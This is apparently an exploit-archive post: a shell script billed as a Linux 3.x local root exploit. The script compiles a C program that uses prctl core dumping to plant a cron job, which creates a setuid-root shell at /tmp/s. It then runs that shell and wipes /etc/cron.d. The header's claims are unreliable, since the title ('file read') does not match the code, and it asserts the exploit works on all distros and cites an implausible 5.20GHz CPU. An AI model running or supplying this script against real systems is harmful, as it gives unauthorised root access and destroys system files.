 	

# Exploit Title: Linux 3.x.x Executable File Read Exploit
# Date: 6/26/12
# Author: Blade
# Version: 3.x.x
# Category:: Local Root Exploit
# Tested on: Linux, Ubuntu
# Demo site: [3 vulnerable site, this will speed up check]

#!/bin/sh
#
# 3.x.x local root exp By: Blade
# + effected systems 3.x.x
# tested on Intel(R) Xeon(TM) CPU 5.20GHz
# Works perfect on all linux distros and servers.
# maybe others ...
# ~
# Use this at your own risk, I'm not responsible for any risk.
# sorchfox@hotmail.com


cat > /tmp/getsuid.c << __EOF__
#include <stdio.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <linux/prctl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>

char *payload="\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n* * * * *   root   chown root.root /tmp/s ; chmod 4777 /tmp/s ; rm -f /etc/cron.d/core\n";

int main() {
    int child;
    struct rlimit corelimit;
    corelimit.rlim_cur = RLIM_INFINITY;
    corelimit.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CORE, &corelimit);
    if ( !( child = fork() )) {
        chdir("/etc/cron.d");
        prctl(PR_SET_DUMPABLE, 2);
        sleep(200);
        exit(1);
    }
    kill(child, SIGSEGV);
    sleep(120);
}
__EOF__

cat > /tmp/s.c << __EOF__
#include<stdio.h>
main(void)
{
setgid(0);
setuid(0);
system("/bin/sh");
system("rm -rf /tmp/s");
system("rm -rf /etc/cron.d/*");
return 0;
}
__EOF__
echo "wait aprox 4 min to get sh"
cd /tmp
cc -o s s.c
cc -o getsuid getsuid.c
./getsuid
./s
rm -rf getsuid*
rm -rf s.c
rm -rf prctl.sh
